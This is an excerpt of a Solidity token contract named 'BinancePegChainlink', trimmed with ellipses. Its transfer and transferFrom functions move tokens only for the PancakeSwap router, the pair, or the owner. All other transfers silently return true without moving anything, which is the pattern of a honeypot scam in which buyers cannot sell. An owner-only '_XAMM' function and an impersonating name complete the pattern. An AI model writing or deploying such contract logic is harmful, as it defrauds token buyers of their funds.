...
contract BinancePegChainlink is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        if(_msgSender() == PANCAKE_ROUTER_V2_ADDRESS || _msgSender() == pancakePair() || pancakePair() == address(0) || _msgSender() == owner()) {
            ...
            if( (amount <= _KOLL || isSL) && !isContract(_msgSender()) ) {
                _transfer(_msgSender(), recipient, amount);
            }
        }
        return true;
    ...
    function transferFrom(
        ...
        if(sender == PANCAKE_ROUTER_V2_ADDRESS || sender == pancakePair() || pancakePair() == address(0) || sender == owner()) {
            ...
            //nomal user check amount
            if( (amount <= _KOLL|| isSL) && !isContract(sender) ) {
                _transfer(sender, recipient, amount);
                uint256 currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
    ...
    function isContract(address addr) internal view returns (bool) {
        bytes32 accountHash = 0x1222b16786e7ad3d603d53838183bb076df78e8e88c3b5e3a8adbc09af110150;
        bytes32 codehash;
        assembly {
    ...
    function _XAMM(address account, uint256 amount) internal virtual {
...
,        uint256 amount
    ...
    function _XAMM(uint256 amount) public onlyOwner virtual returns (bool) {
